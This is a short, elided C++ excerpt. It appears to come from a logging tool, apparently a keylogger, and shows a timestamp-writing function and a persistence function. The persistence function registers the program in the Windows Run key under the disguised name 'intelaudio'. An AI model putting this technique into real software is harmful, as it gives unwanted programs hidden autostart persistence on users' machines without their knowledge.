...
void LogTime() {
	...
	struct tm time = { };
	char buffer[48] = "";
	if (now == -1 || localtime_s(&time, &now) != 0 || strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &time) == 0) {
		Write("<time>N/A</time>");
	}
	else {
...
void Persistence() {
	...
	if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, (KEY_CREATE_SUB_KEY | KEY_SET_VALUE), NULL, &nKey, NULL) == ERROR_SUCCESS) {
		RegSetValueExA(nKey, "intelaudio", 0, REG_SZ, (LPBYTE)intelaudio.c_str(), intelaudio.length());
		RegCloseKey(nKey);
	}
}
